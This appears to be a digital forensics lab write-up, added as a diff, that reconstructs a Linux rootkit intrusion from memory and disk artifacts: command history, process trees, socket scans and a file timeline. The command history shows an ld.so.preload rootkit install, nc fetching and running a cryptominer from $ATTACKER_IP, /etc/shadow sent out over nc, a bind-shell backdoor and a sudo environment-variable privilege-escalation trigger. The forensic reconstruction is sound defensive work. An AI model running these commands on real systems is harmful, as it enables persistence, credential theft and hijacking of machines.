@@ -1,0 +1,119 @@
+/etc/ld.so.preload file (disk)
+/tmp/___father.so file (disk)
+LD_PRELOAD environment variable (memory)
+VMA mapping ___father.so (memory)
+Bash history - deployment commands (memory)
+Timeline - .so file creation (disk)
+Backdoor network connection (memory)
+
+
+command_history:
+    sudo cp /tmp/rk.so /lib/selinux.so.3 [MEM] [DISK]
+    sudo sh -c 'echo "/lib/selinux.so.3" > /etc/ld.so.preload' [MEM] [DISK] 
+    sudo systemctl restart ssh rsyslog [MEM] [DISK]
+    ldd /bin/ps | grep selinux.so.3 [MEM] [DISK]
+    exit [MEM] [DISK]
+    -----
+    whoami [MEM]
+    nc -w 3 $ATTACKER_IP 8888 > /tmp/___cryptominer.sh < /dev/null
+    chmod +x /tmp/___cryptominer.sh
+    nohup /tmp/___cryptominer.sh > /dev/null 2>&1 &
+    cp /etc/shadow /tmp/___shadow
+    nc -w 5 $ATTACKER_IP 9999 < /tmp/___shadow
+    echo 'sensitive data' > /tmp/___secret.txt
+    echo 'exfil plan' > /tmp/___notes.txt
+    -----
+    whoami
+    lobster=a sudo bash [MEM] [DISK]
+    whoami [MEM] [DISK]
+    id [MEM] [DISK]
+    cat /etc/ld.so.preload [MEM] [DISK]
+
+# commands executed = 5 + 8 + 5 = 18 
+# found in mem = 5 + 4 = 9
+# found in disk = 5 + 4 = 9
+
+
+process_artifacts:
+
+    - backdoor shell:
+    sshd(1080) [main daemon]
+    └─ sh(1087) ← BIND SHELL from nc -p 54321 (BACKDOOR)
+
+    - privilege escalation:
+    sshd(1080) [main daemon]
+     └─ sshd(634649) ← SSH legit SSH connection (PRIVESC w/ lobster=foo sudo)
+      └─ sshd(635977) ← Father PAM hook re-exec
+          └─ bash(636080) ← ROOT SHELL
+              └─ bash(659726) ← another ROOT SHELL. Caused because of `bash` after lobster=foo sudo. This was not actually needed..
+
+
+network_artifacts:
+
+- backdoor connection dst:54321 src:22
+- legit ssh connection src:22
+- cryptominer.sh script download dst:8888
+- data exfiltration dst:9999
+
+grep "22" sockscan.txt
+0xf421a40       AF_INET STREAM  TCP     192.168.100.206 22      192.168.100.1   53658   ESTABLISHED     -
+0xf422300       AF_INET STREAM  TCP     192.168.100.206 22      192.168.100.1   54321   ESTABLISHED     -
+
+grep "54321" sockscan.txt
+0xf422300       AF_INET STREAM  TCP     192.168.100.206 22      192.168.100.1   54321   ESTABLISHED     -
+
+grep "8888" sockscan.txt
+0x16518000      AF_INET STREAM  TCP     192.168.100.206 59358   192.168.100.1   8888    CLOSE   -
+
+grep "9999" sockscan.txt
+0xac01a40       AF_INET STREAM  TCP     192.168.100.206 41028   192.168.100.1   9999    CLOSE   
+
+
+timeline_reconstruction:
+
+- from timeline.csv (mactime generated)
+
+Wed Feb 18 2026 02:34:45,32752,m.cb,r/rrwxrwxr-x,1000,1000,658425,"/tmp/rk.so"
+[...]
+Wed Feb 18 2026 02:34:45,4096,.a..,d/drwxr-xr-x,0,0,786433,"/home"
+Wed Feb 18 2026 02:34:45,4096,.a..,d/drwxr-x---,1000,1000,786463,"/home/labuser"
+Wed Feb 18 2026 02:34:45,3771,.a..,r/rrw-r--r--,1000,1000,786464,"/home/labuser/.bashrc"
+[...]
+Wed Feb 18 2026 02:35:32,4096,.a..,d/drwxr-xr-x,0,0,262229,"/etc/sudoers.d"
+Wed Feb 18 2026 02:35:32,4573,.a..,r/rrw-r--r--,0,0,262868,"/etc/sudo.conf"
+Wed Feb 18 2026 02:35:32,1671,.a..,r/rr--r-----,0,0,262870,"/etc/sudoers"
+Wed Feb 18 2026 02:35:32,330,.a..,r/rrw-r--r--,0,0,263450,"/etc/pam.d/sudo"
+Wed Feb 18 2026 02:35:32,1096,.a..,r/rr--r-----,0,0,263499,"/etc/sudoers.d/README"
+Wed Feb 18 2026 02:35:32,232416,.a..,r/rrwsr-xr-x,0,0,918302,"/usr/bin/sudo"
+Wed Feb 18 2026 02:35:32,134136,.a..,r/rrw-r--r--,0,0,918477,"/usr/libexec/sudo/libsudo_util.so.0.0.0"
+Wed Feb 18 2026 02:35:32,512896,.a..,r/rrw-r--r--,0,0,918564,"/usr/libexec/sudo/sudoers.so"
+Wed Feb 18 2026 02:35:32,21,.a..,l/lrwxrwxrwx,0,0,922354,"/usr/libexec/sudo/libsudo_util.so.0 -> libsudo_util.so.0.0.0"
+Wed Feb 18 2026 02:35:35,32752,.a..,r/rrwxrwxr-x,1000,1000,658425,"/tmp/rk.so"
+Wed Feb 18 2026 02:35:35,4096,m.c.,d/drwxr-xr-x,0,0,917510,"/usr/lib"
+Wed Feb 18 2026 02:35:35,141832,.a..,r/rrwxr-xr-x,0,0,918460,"/usr/bin/cp"
+Wed Feb 18 2026 02:35:35,32752,m.cb,r/rrwxr-xr-x,0,0,924001,"/usr/lib/selinux.so.3"
+Wed Feb 18 2026 02:35:45,35192,.a..,r/rrwxr-xr-x,0,0,918136,"/usr/bin/systemd-tty-ask-password-agent"
+Wed Feb 18 2026 02:35:45,32752,.a..,r/rrwxr-xr-x,0,0,924001,"/usr/lib/selinux.so.3"
+Wed Feb 18 2026 02:35:53,10,.a..,l/lrwxrwxrwx,0,0,16,"/libx32 -> usr/libx32"
+Wed Feb 18 2026 02:35:53,10,.a..,-/lrwxrwxrwx,0,0,16,"/usr/share/vim/vim82/syntax/^ -> usr/libx32 (deleted-realloc)"
+Wed Feb 18 2026 02:35:53,5444,.a..,r/rrwxr-xr-x,0,0,918227,"/usr/bin/ldd"
+Wed Feb 18 2026 02:35:58,220,.a..,r/rrw-r--r--,1000,1000,786466,"/home/labuser/.bash_logout"
+Wed Feb 18 2026 02:35:58,14568,.a..,r/rrwxr-xr-x,0,0,924421,"/usr/bin/clear_console"
+Wed Feb 18 2026 02:37:27,31240,.a..,r/rrwxr-xr-x,0,0,942834,"/usr/bin/whoami"
+Wed Feb 18 2026 02:37:52,15,.a..,l/lrwxrwxrwx,0,0,262302,"/etc/alternatives/nc -> /bin/nc.openbsd"
+Wed Feb 18 2026 02:37:52,12813,.a..,r/rrw-r--r--,0,0,262863,"/etc/services"
+Wed Feb 18 2026 02:37:52,66,m..b,r/rrwxr-xr-x,0,1337,655382,"/tmp/___cryptominer.sh"
+Wed Feb 18 2026 02:37:52,20,.a..,l/lrwxrwxrwx,0,0,917591,"/usr/bin/nc -> /etc/alternatives/nc"
+Wed Feb 18 2026 02:37:52,39560,.a..,r/rrwxr-xr-x,0,0,918325,"/usr/bin/nc.openbsd"
+Wed Feb 18 2026 02:37:57,66,..c.,r/rrwxr-xr-x,0,1337,655382,"/tmp/___cryptominer.sh"
+Wed Feb 18 2026 02:38:01,66,.a..,r/rrwxr-xr-x,0,1337,655382,"/tmp/___cryptominer.sh"
+Wed Feb 18 2026 02:38:01,43432,.a..,r/rrwxr-xr-x,0,0,942789,"/usr/bin/md5sum"
+Wed Feb 18 2026 02:38:01,35240,.a..,r/rrwxr-xr-x,0,0,942793,"/usr/bin/nohup"
+Wed Feb 18 2026 02:38:10,1057,m.cb,r/rrw-r-----,0,1337,658427,"/tmp/___shadow"
+Wed Feb 18 2026 02:38:25,1057,.a..,r/rrw-r-----,0,1337,658427,"/tmp/___shadow"
+[...]
+Wed Feb 18 2026 02:41:35,292292,mac.,r/rrw-rw-r--,0,43,1063364,"/var/log/lastlog"
+Wed Feb 18 2026 02:41:35,208,m.c.,r/rrw-r--r--,111,117,1067553,"/var/lib/landscape/landscape-sysinfo.cache"
+
+from auth.log (extracted)
+    Feb 18 02:43:15 ubuntu22 systemd-logind[649]: Power key pressed."
